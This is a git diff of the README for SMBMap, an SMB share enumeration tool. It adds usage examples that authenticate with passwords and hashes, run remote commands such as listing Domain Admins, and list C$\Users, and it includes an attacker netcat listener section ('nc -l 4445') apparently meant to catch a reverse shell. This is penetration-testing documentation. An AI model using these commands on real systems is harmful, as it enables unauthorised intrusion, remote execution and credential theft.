@@ -20,6 +20,7 @@ http://sourceforge.net/projects/pyasn1/
 - Distrubted file content searching (new!)
 - File name matching (with an auto downoad capability)
 
+## Help 
 ```
 SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
 
@@ -82,7 +83,7 @@ $ python smbmap.py -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028
 $ python smbmap.py -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group "Domain Admins" /domain'
 ```
 
-## Sample Default Output:
+## Default Output:
 ```
 $ cat smb-hosts.txt | python smbmap.py -u jsmith -p 'R33nisP!nckl3' -d ABC
 [+] Reading from stdin
@@ -105,7 +106,9 @@ $ cat smb-hosts.txt | python smbmap.py -u jsmith -p 'R33nisP!nckl3' -d ABC
         WWWROOT_OLD                                             NO ACCESS
         ADMIN$                                                  READ, WRITE
         C$                                                      READ, WRITE
-
+```
+## Command execution:
+```
 $ python smbmap.py -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -h 192.168.2.50
 [+] Finding open SMB ports....
 [+] User SMB session establishd...
@@ -119,6 +122,27 @@ Members
 abcadmin                  
 The command completed successfully.
 ```
+## Non recursive path listing (ls):
+```
+$ python smbmap.py -H 172.16.0.24 -u Administrator -p 'changeMe' -r 'C$\Users'
+[+] Finding open SMB ports....
+[+] User SMB session establishd...
+[+] IP: 172.16.0.24:445 Name: 172.16.0.24                                       
+    Disk                                                    Permissions
+    ----                                                    -----------
+    C$                                                      READ, WRITE
+    .Users                                             
+    dw--w--w--                0 Wed Apr 29 13:15:25 2015    .
+    dw--w--w--                0 Wed Apr 29 13:15:25 2015    ..
+    dr--r--r--                0 Wed Apr 22 14:50:36 2015    Administrator
+    dr--r--r--                0 Thu Apr  9 14:46:57 2015    All Users
+    dw--w--w--                0 Thu Apr  9 14:46:49 2015    Default
+    dr--r--r--                0 Thu Apr  9 14:46:57 2015    Default User
+    fr--r--r--              174 Thu Apr  9 14:44:01 2015    desktop.ini
+    dw--w--w--                0 Thu Apr  9 14:46:49 2015    Public
+    dr--r--r--                0 Wed Apr 22 13:33:01 2015    wingus
+```
+
 ## File Content Searching:
 
 ```
@@ -137,7 +161,7 @@ C:\Users\wingus\AppData\Roaming\Mozilla\Firefox\Profiles\35msadwm.default\logins
 C:\Users\wingus\AppData\Roaming\Mozilla\Firefox\Profiles\35msadwm.default\prefs.js
 ```
 
-## Drive Listing
+## Drive Listing:
 This feature was added to compliment the file content searching feature
 
 ```
@@ -161,7 +185,7 @@ $ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'power
 [!] Error encountered, sharing violation, unable to retrieve output
 ```
 
-## Attackers Netcat Listener
+## Attackers Netcat Listener:
 
 ```
 $ nc -l 4445
